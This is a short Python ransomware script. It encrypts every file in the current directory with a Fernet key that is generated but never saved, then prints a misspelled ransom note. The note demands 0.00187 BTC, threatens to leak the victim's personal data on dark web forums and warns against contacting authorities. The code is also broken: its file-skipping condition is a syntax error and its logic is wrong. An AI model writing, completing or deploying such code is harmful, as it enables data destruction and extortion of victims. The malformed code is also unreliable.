# import os and Fernet modules
import os
from cryptography.fernet import Fernet

# create an empty list to store the names of the files to be encrypted
files = []

# loop through the files in the current directory
for file in os.listdir():
    if file == "thekey.key" or == "privatekey.key" or "decrypt.py":
        continue 
    if os.path.isfile(file):
        files.append(file)

# print the list of files to be encrypted
print(files)

# generate a new key
key = Fernet.generate_key()

# loop through the files to be encrypted
for file in files:
    # open the file in binary read mode
    with open(file, "rb") as thefile:
        # read the contents of the file
        contents = thefile.read()
        # encrypt the contents using the generated key
        contents_encrypted = Fernet(key).encrypt(contents)
        # open the file in binary write mode
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)
            # write the encrypted contents back
            
            
            
            
print("DO NOT PANIC AND READ ALL OF THE FOLOWING WITH MOST PRECISION. ALL OF YOUR FILES HAVE BEEN ENCRYPTED. SEND ME PRECICLY 0.00187 BITCION (BTC) OR ALL OF YOUR FILES POSSIBLY CONTAINING PAYMENT INFORMATION ASWELL AS LOCATION NAME AND AGE WILL BE DEPOSITED IN VARIUOUS DARK WEB FORUMS. YOU ARE UNDER DIRECT ATTACK FROM THE MOST SOPHISTICTED METHOD OF ENCRYTION. DO NOT ATTEMPT TO REQUEST ASSISTANCE FROM AUTHORITIES OR YOUR FILES WILL AUTOMATICLY BE LEAKED THREATENING YOUR SAFETY.")
